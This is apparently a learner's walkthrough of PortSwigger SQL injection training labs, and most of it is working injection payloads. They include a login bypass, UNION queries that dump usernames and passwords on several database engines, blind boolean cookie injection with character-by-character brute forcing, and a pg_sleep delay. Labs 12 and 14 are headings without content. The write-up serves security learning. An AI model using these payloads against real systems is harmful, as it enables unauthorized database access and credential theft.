# SQL Injection

 - [Retrieving hidden data](#retrieving-hidden-data)
 - [UNION attacks](#union-attacks)
 - [Blind SQL injection](#blind-sql-injection)

Details at [here](https://portswigger.net/web-security/sql-injection)

Type of SQL injection in example

- [Retrieving hidden data](#retrieving-hidden-data)
- [UNION attacks](#union-attacks)
- [Blind SQL injection](#blind-sql-injection)

Type of SQL injection attack:
 - In-band SQLi (data is returned to the attacker in the same HTTP response as the SQL query)
  - Error-based SQLi: error messages returned by the web application contain sensitive data
  - Union-based SQLi: using union query to retrieve data from other tables
 - Inferential (Blind) SQLi (data is not returned to the attacker in the same HTTP response as the SQL query)
  - Boolean-based SQLi: using boolean logic to infer the results of SQL queries
  - Time-based SQLi: using time delays to infer the results of SQL queries
 - Out-of-band SQLi (DNS or HTTP requests to transfer data to an attacker-controlled server)

---

## Retrieving hidden data

Modify an SQL query to return additional results

[Lab 1](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

Description of this lab: the query of 1 category `Gifts`

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

And sample URL query: `https://example.com/filter?category=Gifts`

Goal: display details of all products in any category, both *released and unreleased*

`SELECT * FROM products WHERE category = '' or '1'='1' AND released = 1`

We just only adjust in `category=` and put into `''`, so the final payload:
`' or '1'='1` or `https://example.com/filter?category=%27%20or%20%271%27or%271` 

[Lab 2](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

Description of this lab: inject in login page as username: administrator

So we need to modify the password, and check the password with the previous payload: `' or '1'='1`, and it worked

## UNION attacks

Detail found at [here](https://portswigger.net/web-security/sql-injection/union-attacks)

See cheat sheet [here](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[Lab 3](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

Description of this lab: vulnerability in the product category filter, use a UNION attack to retrieve data from other tables

Firstly, we need to identify the number of columns in the table, and use payload: `' ORDER BY <number-of-column> --` to check, after we use `' ORDER BY 4 --`, we got the error `Internal Server Error` so the column is 3.

Finally, we use `' UNION SELECT NULL, NULL, NULL--` to make a union attack at `/filter?category=` then solved this challenge.

[Lab 4](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

Description of this lab: You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. After that, alter NULL to random text on the homepage, for example: 'qG26iL'

Do as same as the previous one with `' UNION SELECT NULL, NULL, NULL--`. After trying, the final payload is `' UNION SELECT NULL, 'qG26iL', NULL--`

[Lab 5](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

Description of this lab: The database contains a different table called users, with columns called username and password

In this lab, there are 2 columns in this table

Do the same as the previous one with `' UNION SELECT NULL, NULL--`. Follow the description, and change NULL to username and password. Moreover, we need access to a table named `users`, so the payload is: `' UNION SELECT username, password FROM users--`, then we got all username and password.

Login with the password of user `administrator`: nq3glruptcrilo0yscf6 and solved the lab.  

[Lab 6](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

This lab has the same description as the previous one, but we need to retrieve multiple values in a single column. Furthermore, in this lab, we can use only the second column.

Look at the cheat sheet, we can use the string concatenation technique. After trying, we found this lab use `||` for concatenate string. The final payload is `' UNION SELECT NULL, username||':'||password FROM users--` to get all usernames and passwords.

Login with the password of user `administrator`: 532codf0er823llefy7x and solved the lab. 

[Lab 7](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

Description of this lab: display the database version string of Oracle

In this lab, the available number of columns is 2. Look at the cheat sheet, try with: `SELECT banner FROM v$version` and the final payload is: `' UNION SELECT banner, NULL FROM v$version--`, then solved the lab.

[Lab 8](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

This lab has the same description as the previous one, but for MySQL and Microsoft.

The final payload is `' UNION SELECT @@version, NULL#`, we will change `v$version` to `@@version`, `--` to `#`, then solved the lab.


[Lab 9](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

Description of this lab: You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

This lab has 2 available columns, we need to determine the name of table first. However, determine the version of database. After trying, `' UNION SELECT version(), NULL--` worked and result is `PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit`

Check the cheat sheet, found database contents with PostgreSQL using `' UNION SELECT table_name, NULL FROM information_schema.tables--`. So there are a lot of tables, find the column of table `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ahngdj'--`, the result is columns names: username_ivoiag and password_vxgmam

The final payload is `' UNION SELECT username_ivoiag, password_vxgmam FROM users_ahngdj--`, the password of administrator is l9jw2he0g1jr5zzndr3o. Login with this password, then solved the lab.

[Lab 10](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

This lab has the same description as the previous one, but for oracle.

Get all table name in database with `' UNION SELECT table_name, NULL FROM all_tables--`, and the name of table which we need to access is USERS_NOFLTA then use `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_NOFLTA'--` to get name of password and username column: PASSWORD_EVVZCC & USERNAME_ETTQUM.

The final payload is: `' UNION SELECT USERNAME_ETTQUM, PASSWORD_EVVZCC FROM USERS_NOFLTA--` and get password of administrator is qhwrw9aos6k2p2uodezp, login and solved the lab.

## Blind SQL injection 

[Lab 11](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

Description of this lab: The results of the SQL query are not returned, and no error messages are displayed. But the application includes a **Welcome back** message in the page if the query returns any rows. The application uses a tracking **cookie** for analytics, and performs an SQL query containing the value of the submitted cookie.   

The database contains a different table called **users**, with columns called **username and password**, find out the password of the administrator user.

So we need to modify cookie, when we use burp suite, and open page, we will get cookie like this: `Cookie: TrackingId=78FpD4ERhK86IMIp; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`. 

If we modify session, the website will be loss data of this session, so we will modify TrackingID `Cookie: TrackingId=78FpD4ERhK86IMIp+'+or+1=1--; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`, and return page including 'Welcome back', so it is right direction. Only thing we can do is making condition. At the first, determine the length of password `Cookie: TrackingId=78FpD4ERhK86IMIp+'or+(SELECT+LENGTH(password)+FROM+users+WHERE+username='administrator')=20--; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`

Note: using burp intruder for brute force value in condition 

Next, using brute force to guess 20-length password character by character with turbo intruder  

Guess first character
`Cookie: TrackingId=78FpD4ERhK86IMIp+'or+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='%s'--; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`

Using this [script](/Scripts/brutecondition.py) to guess, then write answer for per attack. After 20 trial, we will get password is `s4ykqo9mvgpqisgnzv9t`. Log in with this password and solved the lab.

[Lab 12](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)



[Lab 13](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

Description of this lab: exploit the SQL injection vulnerability to cause a 10 seconds delay.

Using payload similar `Cookie: TrackingId=nTjOlcnGoesLH7fd+'or+pg_sleep(10)--; session=8BYemkFDFxWMOkX21X7uPWmJ0P1fAYRl` to sleep in 10 second, then solved the lab.

[Lab 14](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)







